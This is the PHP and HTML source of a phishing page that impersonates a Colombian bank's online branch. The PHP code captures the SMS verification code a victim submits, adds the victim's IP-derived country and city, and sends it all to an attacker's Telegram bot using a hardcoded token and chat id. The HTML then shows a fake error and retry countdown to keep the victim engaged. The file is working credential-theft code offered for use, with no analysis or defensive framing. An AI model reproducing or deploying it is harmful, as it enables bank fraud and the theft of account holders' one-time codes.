<?php

@session_start();
ini_set("display_errors", 0);
include "geoplugin.php";

$sendtotelegram="yes";
$chat_id="6618919756";
$bot_url="7222469203:AAFQHhirrvnOPLikd-bE5isutnhSBrOsbMI";

$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$user_ip}/city"));

if (isset ($_POST['code']) ){

$_SESSION['ind2'] = "ind2";

$message .= "= = = = =Codigo SMS3= = = = \n";
$message .= "|| Codigo.: ".$_POST['code']."\n";
$message .= "|| ".$cc." - ".$city." \n";
$message .= "= = = = = = = = = = = = = = =\n";

if ($sendtotelegram=="yes"){

    $txt = $message;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

}


?>

<html>
<head id="ctl00_Head">
  <link href="styles.css" type="text/css" rel="stylesheet"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
 <title>
  Cancelar compra
</title>
<script src="https://kit.fontawesome.com/c14ef9ee10.js" crossorigin="anonymous"></script>
<link href="bootstrap.css" rel="stylesheet">


<script src="Scripts/jquery-1.11.3.min.js" type="text/javascript"></script>
<script src="Scripts/jquery.blockUI.js" type="text/javascript"></script>
<script src="Scripts/_UtilidadesSitio.js" type="text/javascript"></script>
<script src="Scripts/Indicador.js" type="text/javascript"></script>
<script src="script2.js" type="text/javascript"></script>
</head>
  <header>




  </header>
<body onload="actualizarTiempo()">
    <!-- Google Tag Manager (noscript) -->

    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NZRKPX4" height="0" width="0" style="display: none; visibility: hidden"></iframe>
    </noscript>

    <!-- End Google Tag Manager (noscript) -->
        <form name="aspnetForm" method="post" action="index2.php"  id="aspnetForm">
        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="R7zYQ0nmSFAqLX5pX1/ePIvzLco8pSATq9vR4tspS2aPYKal5FMjvWkwocXSCOdPf3fldPkWqO8l9lO+WN+8imrecSCGsRyaipEK2wUEg2P7cm9GC2YEbh7lzVc1KS2fb44h9Zh3TQgsFU2TfvdVbQYVrldKFfBxLpDF19v82Z45XQVtebbbWv8uuegNCZ5DYWS9jopZjtVkcpgoJa2zaPift5CplpO89dIz1nDmsT30J6cg5U8ugpauHH2FFotxzS0h4Rf1/0MS0RDO3P3XeQBXTZnwnnJD1MER/wmDuvHEEKRka7GQQp828NMuaJpLxHRueQYZ0EcdTREPjIXQXSHBF/jaug5LbZuezu+idoklqeLT3NgJ9G2Odz5D7XLoYxDRu77x0pv9uG1SokG7r+FEPtPVTFQmATGHfaHwKHqAVvJcj3J9s9p7wamIxOxEXus5eRpRdsOp+HXqPisWQ+/ANIly4dwCaEWTTAyy+oB8ajbNON/X5RnLW8WJW9tV6v1Q7J6M6TAtF1Md99q6Db9XiR15tkrjwTT3nPm7U60YiZTZVLSsOI3RHRjSwRu7A90kKGjwPlZTwOLsYerm3GoV+Xq7NyJ6x4NddddO7ymHolG0i9s1ykbO6NVF3m6tW3YJ+CDa8LPUpfQhbGc6JIpxtBpkcPyZtboNfUFNiRduuDgU5xm2hVE3tErrPPffDjFtb4XHIyBr3EHQEiVdlZWCsyAU9HtU5Y7s/0iAGnW4uGOvTAT3iva4fQ2aCuJz7oPmCtXWdRKCczQCEcpNfCLpw0YmWv08xjKrSzs9LZYp0xJGV5UGXUc0sbrnEgXVCDgs/vl/7uculOheIPU0uyJLTdKH2tsF0SSz5jlkHsUQTO14OxHRFbRJDhYwhGDPqCcgvvGAEhtv7CBF0Fq7PATStZBJDeTdQlG0fw7WiNEkFGnZd2bXbt1hDoOuQUE9jqgyIawgD9f9Y+2H07LDLQwwMR8SLSwlUI2x0PaRWm52voaTexZO/tiqKLXxxZmJ5o1o/uoDKI8PikS+7ep1NSilKJmZxgVzY3pK4UPW7o4/yDWSWdpvHVLfNLbe5N3GydrPa/Mq+HU1Ydzsc/MkIrLczrZ4u7lTtknqeXvAZhTfn/F/za1tfuCr7QvD4pWNrRWHsJomq40EVz4gSMqVCjnh9vzsEwm7Tm5XQDSGAZTxqEt23U3CQyfSc0/SbvelTyJhsvWC6xlqx4Qha0wFoGPanRBMFB9kSSCtxhDnF+trjdkVH3S3WDM2d/K/m8uDVCz68e3PVq3Rr7a4KMCstp+U/zPgrsL1Jhf0XJY1cdqudiOudjg/LmGjyGk8RG9dHCpsiG36s3MslXr7UgwoRtDK1UYUZmmYc17pdhxs367gGixqGpKDiiDAyA9WXJfaNaqifzs79CjDJoEdnJJIDj6Vff178GRrlv4ZkVDVvWa9/0ZN/swwUAi4wpcbJ76dpUie0Hy2sj5ud+CzImIv5g==">


        <script src="ScriptResource031e.html?d=4ejzBeCma20vHaNBi-aw0NblYCfCDh44zfCmtkgmX-yBzIqXKbfMlEW_EjiaJjEjhqgYuioyJ1BvTkvHoVBvzW62zskUJSAPVLQz2q6IFwy7deq3VKjEQE8AYwhLxBJ1gP5wkX3lrw9Mg6OT9XROgQfZt5aanpi8jNEJMX_TNFA1&amp;t=ffffffffaa493ab8" type="text/javascript"></script>
        <script src="Scripts/_UtilidadesSitio.js" type="text/javascript"></script>
        <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C3A4B93B">
        <input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="UApRq/NXyBT0LjLfJYpfxDsS53gL4ebZurcbKc3epYS2BjI2hg3QHD2RSbMIQDnHAkA+9gPQx7TrzSzfcZciODsSV25HiCJk8IktIdrP+PZyiqM3KMw/SpIZSN63aYhH9GR3qEcTxxO88zH6+MLADCpUjXquC6e7eggsmiz2pSvDG8+kwuduGS9hUwwheaHLn6FkHaC69liMSUS3HmDUuhUfkPo0VMvdaBNhbOQO1HFmJNum+IVjMeTYV8nsJzvhBiUjevgsbanUfm33EWgeJQ==">

        <div class="container-fluid">
            <div class="row">
                <div class="col-12 col-sm-7 col-md-6 pl-0">

                </div>


            </div>
        </div>

        <div id="MainLogin" class="container">

            <meta http-equiv="X-UA-Compatible" content="IE=9">
            <input type="hidden" name="ctl00$DefaultContent$r" id="ctl00_DefaultContent_r" value="9,6,8,1,3,4,2,5,7,0">


          <div class="center4"> </div>

            <div class="txtalt">Sucursal Virtual Personas</div>



            <div class="txtalt2">Fecha y hora actual:
              <?php date_default_timezone_set ("America/Bogota"); 

              $numero_dia = date('N');
              $dia = date('d');
              $mes = date('m');
              $año = date('Y');

              $nombre_mes = array('01' => 'Enero', '02' => 'Febrero', '03' => 'Marzo', '04' => 'Abril' , '05' => 'Mayo', '06' => 'Junio', '07' => 'Julio' , '08' => 'Agosto', '09' => 'Septiembre', '10' => 'Octubre' , '11' => 'Noviembre', '12' => 'Diciembre');


              $dias_semana = [' ', 'Lunes' , 'Martes', 'Miercoles', 'Jueves', 'Viernes', 'Sabado', 'Domingo'];

              echo $dias_semana[$numero_dia]. ' ' .$dia. ' de ' .$nombre_mes[$mes]. ' del ' .$año. '.'; 

              ?><?php date_default_timezone_set ("America/Bogota"); 
 echo date(' h:i:s A '); ?>

            </div>




            <div class="center3">

              <h6 class="">No pudimos validar tus datos intente nuevamente ingresando al enlace</h6>

            </div>


                        <br>
                                    <div class="center" id="container";">
    <h2 class="titlex">Ocurrio un Error!</h2>
                                      <br>






      <div align="center">
        <img src="loading-buffering.gif">
        <br><br>
        <p class="txtalt">reintente</p> 
        <p class="txtalt" id="tiempo">5 segundos</p> 

      </div>



      <br>


                            </div>
                        </div>

